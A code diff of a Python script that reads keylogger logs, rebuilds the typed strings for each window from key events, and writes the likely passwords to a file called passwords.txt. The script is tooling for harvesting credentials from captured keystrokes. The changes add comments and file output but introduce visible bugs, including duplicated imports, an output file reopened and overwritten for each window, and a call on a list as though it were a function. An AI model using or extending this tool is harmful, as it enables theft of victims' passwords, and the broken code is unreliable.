@@ -1,5 +1,7 @@
 import sys
 import os.path
+import sys
+import os.path
 
 # A function to automatically add input strings from common log in windows
 # as passwords
@@ -21,7 +23,7 @@ def isLoginWindow(w):
     return False
 
 # A way to only load specific log files
-filename = "log.txt"
+logFile = "passwords.txt"
 while True:
     filename = input("Filename: ")
     if (filename == ""):
@@ -54,6 +56,7 @@ dictionary = {}
 
 
 while(len(line) > 15):
+    #Parses log file based on semi-colons
     lineList = line.split(":")
     timestampHours = lineList[0][11:]
     timeStampMinutes = lineList[1]
@@ -66,9 +69,11 @@ while(len(line) > 15):
 
     currentString = currentString.strip()
 
+    #If a backspace was given as a key, we delete the last letter given. 
     if(key.strip() == "[backspace]" and not len(currentString) == 0):
         currentString = currentString[:-1]
 
+    #We want to divide words or strings when a space or enter has been typed
     elif(key.strip() == "[space]" or key.strip() == "[enter]"):
         if window in dictionary.keys():
             dictionary[window].append(currentString)
@@ -76,7 +81,7 @@ while(len(line) > 15):
         else:
             dictionary[window] = [currentString]
             currentString = ""
-
+    #Further split strings on tabs
     elif(key.strip() == "[tab]"):
         if window in dictionary.keys():
             array = dictionary[window]
@@ -86,16 +91,15 @@ while(len(line) > 15):
             dictionary[window] = [currentString]
             currentString = ""
         
-
+    #Split strings based on the windows given focus
     elif(not window == lastWindow):
-        print("huzzah!")
         if lastWindow in dictionary.keys():
             dictionary[lastWindow].append(currentString)
             currentString = key
         else:
             dictionary[window] = [currentString]
             currentString = key
-
+    #Split strings based on the time of key press. 
     else:
         timeStampSeconds = int(timeStampSeconds)
         timeStampMinutes = int(timeStampMinutes)
@@ -129,7 +133,6 @@ while(len(line) > 15):
     lastWindow = window
     lastSeconds = timeStampSeconds
     lastMinutes = timeStampMinutes
-    print(key)
     line = file.readline()
         
 passwordList = []
@@ -145,9 +148,19 @@ for key in dictionary.keys():
             passwordList.remove(i)
             passwordList.insert(0,i)
 
-    print("The potential passwords for " + key + " are: ")
+    try:
+        log = open(logFile, "w")
+        
+    except:
+        print("Something went wrong while writing to the file.")
+        sys.exit(1)
+    
+
+    log.write("The potential passwords for " + key + " are: ")
 
     for i in passwordList:
-        print(i)
+        log.write(passwordList(i))
 
     passwordList = []
+
+log.close()
